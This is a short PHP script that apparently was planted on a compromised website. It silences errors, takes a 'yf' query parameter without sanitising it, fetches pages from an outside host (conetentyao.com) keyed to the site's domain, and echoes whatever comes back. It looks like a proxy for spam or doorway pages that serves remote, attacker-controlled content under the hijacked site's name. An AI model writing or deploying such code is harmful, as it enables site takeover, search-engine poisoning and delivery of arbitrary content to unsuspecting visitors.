<?php
ini_set('display_errors',0);

$id = sitemap;

if(isset($_GET['yf'])){
	$page = $_GET['yf'];
$pages = explode("-",$page);
$id=$pages[0];
	}

$content = file_get_contents("http://conetentyao.com/6.14/jjmedeiros.com.br/?p=$id");

if($content!="no"){
 echo $content;
}
exit;
?>